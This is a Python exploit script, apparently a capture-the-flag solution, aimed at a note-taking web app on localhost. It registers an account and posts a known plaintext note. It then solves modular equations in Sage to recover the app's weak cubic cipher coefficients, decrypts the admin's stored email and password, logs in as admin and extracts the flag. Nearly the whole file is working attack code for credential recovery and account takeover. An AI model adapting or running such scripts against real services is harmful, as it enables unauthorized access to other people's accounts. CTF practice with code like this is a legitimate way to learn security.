from pwn import *
import requests
import re
from sage.all import *
import string

URL = '127.0.0.1'
PORT = 5002

s = requests.Session()

alphabet = string.ascii_lowercase + '345' + '@_:.'
print(alphabet)
def register_user(data):
    response = s.post(f'http://{URL}:{PORT}/sign-up', data=data)
    return response

def login_user(data):
    response = s.post(f'http://{URL}:{PORT}/login', data=data)
    return response

def add_note(data):
    response = s.post(f'http://{URL}:{PORT}/', data=data)
    return response

def extract_hex_string(text, hex_length):
    # Используем регулярное выражение для поиска hex-строки заданной длины
    pattern = rf'\b[0-9a-fA-F]{{{hex_length}}}\b'
    hex_strings = re.findall(pattern, text)

    return hex_strings

def decode(hex_string):
    
    return int(hex_string, 16)

def solve_system_mod(equations, modulus):
    try:
        # Создаем символьные переменные
        x, y, z = var('x y z')

        # Преобразуем строки в уравнения
        system = [SR(eq) for eq in equations]

        # Решаем систему уравнений по модулю
        solution_mod = solve_mod(system, modulus, solution_dict=True)

        # Преобразуем значения переменных к модулю
        solution = {var: val % modulus for var, val in solution_mod[0].items()}

        return solution
    except Exception as e:
        return f"Ошибка при решении системы уравнений: {e}"
    
def solve_equation_mod(equation, modulus):
    try:
        # Создаем символьную переменную
        x = var("x")

        # Преобразуем строку в уравнение
        eq = SR(equation)

        # Решаем уравнение по модулю
        solution_mod = solve_mod(eq, modulus, solution_dict=True)

        # Преобразуем значение переменной к модулю
        solutions = [val % modulus for val in solution_mod[0].values()]
        if len(solution_mod) > 1:
            solutions.append([val % modulus for val in solution_mod[1].values()][0])

        return solutions
    
    except Exception as e:
        return f"Ошибка при решении уравнения: {e}"
    
def crack(string, encoded_string):

    system = []
    encoded_string = bytes.fromhex(encoded_string)
    for i in range(1, len(encoded_string)):

        eq  = 'a * ' + str(pow(ord(string[i]), 3)) + ' + b * ' + str(pow(ord(string[i]), 2)) + ' + c * ' + str(pow(ord(string[i]), 1)) + ' + ' + str(encoded_string[i-1] - encoded_string[i])
        system.append(eq)
    #print(system)
    solution = solve_system_mod(system, 256)
    return solution

def decrypt(data, a, b, c):

    result = ""
    encoded_note = bytes.fromhex(data)
    for i in range(1, len(encoded_note)):

        eq  = str(a) + ' * x^3 + ' + str(b) + ' * x^2 + ' + str(c) + ' * x + ' + str(encoded_note[i-1] - encoded_note[i])

        solution = solve_equation_mod(eq, 256)
        if chr(solution[0]) in alphabet:
            result += chr(solution[0])
        elif len(solution) > 1 and chr(solution[1]) in alphabet:
            result += chr(solution[1])
 
    return result
    
data_register = {'email': 'inssurg3nt@mil.ru',
        'firstName': 'inssurg3nt',
         'password1': 'inssurg3nt',
         'password2': 'inssurg3nt'}

data_login = {'email': 'inssurg3nt@mil.ru', 
    'password': 'inssurg3nt'}

note = {'note': 'inssurgent000_inssurgent000_2400'} # lenght like in admin string

response = register_user(data_register)

response = login_user(data_login)

response = add_note(note)

notes = extract_hex_string(response.text, (len(note['note']) * 2))
enc_note = notes[-1]
adm_note = notes[0]

args = (crack(note['note'], enc_note))
a, b, c = list(args.values())

dec_note = decrypt(adm_note, a, b, c)
admin_note = ('a' + dec_note).split(':')

admin_login = {'email': admin_note[0], 
    'password': admin_note[1]}
print(admin_login)
response = login_user(admin_login)

pattern = r'vka\{.*?\}'
FLAG = re.findall(pattern, response.text)
print("FLAG: ", FLAG[0])